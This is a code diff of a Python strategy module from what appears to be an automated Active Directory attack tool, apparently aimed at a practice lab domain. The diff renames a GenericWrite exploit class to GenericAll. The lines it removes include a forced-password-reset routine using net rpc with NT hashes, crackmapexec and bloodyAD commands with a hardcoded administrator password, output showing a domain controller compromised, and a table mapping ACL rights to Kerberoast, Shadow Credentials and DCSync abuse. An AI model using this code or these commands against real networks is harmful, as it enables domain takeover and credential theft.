@@ -1,12 +1,4 @@
-# strategies/generic_write.py
-# Check with : crackmapexec smb 192.168.56.10 -u ADMINISTRATOR -p 'AutoPwn@1337!' -d sevenkingdoms.local
-# bloodyAD -H 192.168.56.10 -d sevenkingdoms.local -u ADMINISTRATOR -p 'AutoPwn@1337!' get object ADMINISTRATOR --attr pwdLastSet
-# GenericWrite    → write any *non-protected* attribute (pwdLastSet, spn, etc.)
-# GenericAll      → full control (write + delete + read + execute)
-#                  = GenericWrite + Delete + Read + ReadProperty + Execute
-# GenericAll strategies will include delete/modify ACL/etc.
-
-# GenericAll will inherit form GenericWrite
+# strategies/generic_ all.py
 
 from dataclasses import dataclass
 from .exploit_strategy import ExploitStrategy
@@ -23,9 +15,9 @@ from utils.runner import run_tool, run_system_tool
 from utils.cred_store import enrich_creds
 
 @dataclass
-class GenericWriteStrategy(ExploitStrategy):
-    edge:   Edge
-    victim: Node
+class GenericAllStrategy(ExploitStrategy):
+    # Attributes
+    edge  : Edge
 
     @property
     def attacker(self) -> Node:
@@ -34,11 +26,16 @@ class GenericWriteStrategy(ExploitStrategy):
     @property
     def target(self) -> Node:
         return self.edge.goal_node
-
+    
+    @property
+    def victim(self) -> Node:
+        return self.edge.source_node
+    
+    # Inherited Methods
     def can_exploit(self) -> bool:
-        return self.edge.kind in {EdgeKind.GENERIC_WRITE, EdgeKind.GENERIC_ALL}
+        return self.edge.kind == EdgeKind.GENERIC_ALL # Generic_Write
 
-    def exploit(self, creds: dict) -> ExploitResult:
+    def exploit(self, creds: dict) -> ExploitResult: # Creds class?
         creds = {**creds, "username": _sam(self.attacker.label)}
         creds = enrich_creds(creds)
         if BACKEND.name == "none":
@@ -180,7 +177,7 @@ def _sam(label: str) -> str:
     return label.split("@")[0]
 
 
-def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]:
+def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]: #creds maybe class?
     cmd = [
     #    "bloodyAD",
         "-H",     creds["dc_ip"],
@@ -200,67 +197,3 @@ def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]:
     full_cmd = cmd + subcommand
     print(f"DEBUG bloodyad cmd: {full_cmd}") 
     return cmd + subcommand
-
-"""
-    def _force_change_password_hash(self, creds: dict) -> ExploitResult:
-        target_sam = _sam(self.target.label)
-        new_password = "AutoPwn@1337!"
-
-        # Extract NT hash cleanly
-        nt_hash = creds.get("hashes", "").lstrip(":").strip()
-        if not nt_hash:
-            nt_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"  # empty NT fallback
-
-        ok, output = run_system_tool([
-            "net", "rpc", "password", target_sam, new_password,
-            "-U", f"{creds['domain']}/{creds['username']}%:{nt_hash}",
-            "-S", creds["dc_ip"]
-        ])
-
-        if not ok:
-            raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
-
-        print_done(f"Password changed for {target_sam} → {new_password}")
-
-        return ExploitResult(
-            technique="ForceChangePassword",
-            edge=self.edge,
-            success=True,
-            notes=f"Password successfully reset using net rpc.\n"
-                  f"New credentials:\n"
-                  f"  {target_sam}@{creds['domain']} : {new_password}",
-            gained_access={
-                "username": target_sam,
-                "password": new_password,
-                "domain": creds.get("domain"),
-                "dc_ip": creds.get("dc_ip")
-            }
-        )
-"""
-
-
-"""
-rania@DELL:~$ crackmapexec smb 192.168.56.10 -u ADMINISTRATOR -p 'AutoPwn@1337!' -d sevenkingdoms.local
-[*] First time use detected
-[*] Creating home directory structure
-[*] Creating missing folder logs
-[*] Creating missing folder modules
-[*] Creating missing folder protocols
-[*] Creating missing folder workspaces
-[*] Creating missing folder obfuscated_scripts
-[*] Creating missing folder screenshots
-[*] Copying default configuration file
-SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
-SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\ADMINISTRATOR:AutoPwn@1337! (Pwn3d!)
-"""
-
-
-"""
-Reset password (user)                       GenericAll
-Write SPN --> Kerberoast                    GenericAll, GenericWrite
-Shadow Credentials (msDS-KeyCredentialLink) GenericAll, GenericWrite
-Add member (group)                          GenericAll, GenericWrite (if member is writable)
-Modify DADCL                                GenericAll
-DCSync (WriteDACL abuse)                    GenericAll
-Logon script abuse (scriptPath)             GenericAll, GenericWrite
-"""
